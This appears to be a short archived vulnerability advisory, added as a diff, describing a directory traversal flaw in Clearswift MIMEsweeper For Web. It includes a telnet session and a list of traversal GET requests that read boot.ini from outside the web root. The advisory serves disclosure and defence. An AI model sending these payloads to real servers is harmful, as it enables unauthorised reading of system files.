@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/10918/info
+
+Clearswift MIMEsweeper For Web is reported prone to a directory traversal vulnerability due to insufficient sanitization of user-supplied data.
+
+To carry out an attack an attacker may specify a relative path to a target file in a GET request to the vulnerable server, directory traversal character sequences may be supplied as a part of the request to escape the web root.
+
+telnet www.example.com 80
+Trying www.example.com...
+Connected to www.example.com.
+Escape character is '^]'.
+GET /ca/..\\..\\..\\..\\..\\..\\boot.ini HTTP/1.0
+
+GET /foobar/..\\..\\..\\..\\boot.ini HTTP/1.0
+GET /foobar/..\..\..\..\..\..\\boot.ini HTTP/1.0
+GET /foobar/..\..\..\..\..\..\boot.ini HTTP/1.0
+GET /foobar/\..\..\..\..\..\boot.ini HTTP/1.0
+GET /foobar//..\\..\\..\\..\\boot.ini HTTP/1.0
+GET /foobar//..\\..//..\\..//boot.ini HTTP/1.0
+GET /foobar/\../\../\../\../\boot.ini HTTP/1.0
+GET /foobar/../../../../boot.ini HTTP/1.0
+GET /foobar\..\..\..\..\boot.ini HTTP/1.0
